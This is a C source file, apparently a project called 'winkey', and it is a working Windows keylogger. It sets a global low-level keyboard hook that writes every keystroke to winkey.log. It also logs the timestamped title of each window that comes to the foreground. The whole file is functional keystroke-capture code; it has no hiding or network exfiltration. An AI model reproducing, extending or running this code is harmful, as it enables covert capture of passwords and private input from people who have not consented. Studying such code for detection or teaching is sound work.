#include "../include/winkey.h"

#pragma comment(lib, "user32.lib")

HHOOK			keyboardHook;
HWINEVENTHOOK	windowHook;
FILE*			flog;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
	static char shift = 0;

	if (nCode == HC_ACTION && wParam == WM_KEYDOWN && (key->vkCode == VK_LSHIFT || key->vkCode == VK_RSHIFT))
		shift = 1;
	if (nCode == HC_ACTION && wParam == WM_KEYUP && (key->vkCode == VK_LSHIFT || key->vkCode == VK_RSHIFT))
		shift = 0;

	if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
		fprintf_s(flog, "%s", shift ? _shkey[key->vkCode] : _key[key->vkCode]);
	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

void Wineventproc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject,
	LONG idChild, DWORD idEventThread, DWORD dwmsEventTime)
{
	if (event != EVENT_SYSTEM_FOREGROUND)
		return;
	SYSTEMTIME st;
	int len = GetWindowTextLength(hwnd) + 1;
	char* title = LocalAlloc(LMEM_ZEROINIT, len);

	if (!title) return ;
	GetSystemTime(&st);
	GetWindowText(hwnd, title, len);
	fprintf_s(flog, "\n[%02d.%02d.%d %02d:%02d:%02d] - %s\n", st.wDay, st.wMonth, st.wYear,
		st.wHour, st.wMinute, st.wSecond, title);

	LocalFree(title);
}

void SignalHandler(int signal)
{
	UnhookWindowsHookEx(keyboardHook);
	UnhookWinEvent(windowHook);
	fclose(flog);
}

int		main(void)
{
	MSG msg = { 0 };

	signal(SIGINT, SignalHandler);
	if (!(flog = fopen("winkey.log", "w")))
		return 1;
	fseek(flog, 0, SEEK_END);
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,
									LowLevelKeyboardProc, 0, 0);
	windowHook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND,
								EVENT_SYSTEM_FOREGROUND, 0,
								Wineventproc, 0, 0,
								WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
	while (GetMessage(&msg, 0, 0, 0));
}
